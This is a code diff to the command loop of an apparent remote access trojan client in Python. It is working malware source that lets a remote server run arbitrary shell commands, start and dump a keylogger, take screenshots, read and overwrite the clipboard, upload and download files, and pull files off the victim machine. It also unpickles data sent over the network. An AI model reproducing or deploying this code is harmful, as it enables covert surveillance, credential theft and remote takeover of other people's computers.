@@ -196,29 +196,29 @@ class Client(object):
     def receive_commands(self):
         """ Receives Commands from Server """
         while True:
-            data = self.receive()
-            if data == b'<LIST>':
+            data = pickle.loads(self.receive())
+            # data[0]: command
+            # data[1]: data1
+            # data[2]: data2
+            # ...
+
+            if data[0] == '--l':
                 self.socket.send(b' ')
                 continue
 
-            if data == b'<LISTENING>':
+            if data[0] == '<LISTENING>':
                 self.send(b'<DONE>')
 
-            if data == b'<SEND>':
-                self.send(b'<READY>')
-                packed_data = self.receive()
-                filedata = pickle.loads(packed_data)
-                with open(filedata['filename'], 'wb') as f:
-                    f.write(filedata['data'])
+            if data[0] == '--s':
+                with open(data[1], 'wb') as f:
+                    f.write(data[2])
                 self.send(b'File Transfer Successful\n')
                 continue
 
-            if data == b'<DOWNLOAD>':
-                self.send(b'<READY>')
-                unpacked_data = pickle.loads(self.receive())
+            if data[0] == '--d':
                 try:
-                    r = requests.get(unpacked_data['url'])
-                    with open(unpacked_data['filename'], 'wb') as f:
+                    r = requests.get(data[1])
+                    with open(data[2], 'wb') as f:
                         f.write(r.content)
                 except Exception as e:
                     self.send('Error downloading file: {}\n'.format(str(e)).encode())
@@ -226,18 +226,17 @@ class Client(object):
                 self.send(b'Download Successful\n')
                 continue
 
-            if data == b'<COPY>':
-                self.send(b'<READY>')
-                pyperclip.copy(self.receive().decode())
+            if data[0] == '--c':
+                pyperclip.copy(data[1])
                 self.send(b'<READY>')
                 continue
             
-            if data == b'<INFO>':
+            if data[0] == '--u':
                 self.send('User: {}\nOS: {} {} ({})\n'.format(os.environ['USERNAME'], platform.system(), platform.release(), platform.platform()).encode())
                 continue
 
-            if data == b'<SCREENSHOT>':
-                pic = pyscreenshot.grab('temp.png')
+            if data[0] == '--g':
+                pic = pyscreenshot.grab()
                 if platform.system() == 'Windows':
                     _file = '{}\\temp.png'.format(os.environ['TEMP'])
                 else:
@@ -248,7 +247,7 @@ class Client(object):
                 os.remove(_file)
                 continue
 
-            if data == b'<STARTLOGGER>':
+            if data[0] == '--k start':
                 if not KeyListener.running:
                     KeyListener.start()
                     self.send(b'Started Keylogger\n')
@@ -256,7 +255,7 @@ class Client(object):
                 self.send(b'Keylogger already running\n')
                 continue
                 
-            if data == b'<DUMP>':
+            if data[0] == '--k dump':
                 global KeyboardLogs
 
                 if not KeyListener.running:
@@ -265,7 +264,7 @@ class Client(object):
                     self.send(KeyboardLogs.encode())
                 continue
             
-            if data == b'<STOPLOGGER>':
+            if data[0] == b'--k stop':
                 if KeyListener.running:
                     KeyListener.stop()
                     threading.Thread.__init__(KeyListener) # re-initialise thread
@@ -275,13 +274,12 @@ class Client(object):
                 self.send(b'Keylogger not running')
                 continue
 
-            if data == b'<PASTE>':
+            if data[0] == '--p':
                 self.send(pyperclip.paste().encode())
                 continue
 
-            if data == b'<RECEIVE>':
-                self.send(b'<READY>')
-                filename = self.receive()
+            if data[0] == '--r':
+                filename = data[1]
                 if not os.path.exists(filename):
                     self.send(b'<TRANSFERERROR>')
                     continue
@@ -289,19 +287,19 @@ class Client(object):
                     self.send(f.read())
                 continue
 
-            if data.decode()[:2].lower() == 'cd':
+            if data[0][:2].lower() == 'cd':
                 try:
-                    directory = data.decode()[3:]
+                    directory = data[0][3:]
                     os.chdir(directory.strip())
                 except Exception as e:
                     logging.debug('Error changing cd: {}'.format(str(e)))
                 self.send(os.getcwd().encode())
                 continue
 
-            if len(data) > 0:
-                if data == b'tree':
-                    data = b'tree /A'
-                process = subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            if len(data[0]) > 0:
+                if data[0] == 'tree':
+                    data[0] = 'tree /A'
+                process = subprocess.Popen(data[0], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 for line in iter(process.stdout.readline, ""):
                     if line == b'':
                         break
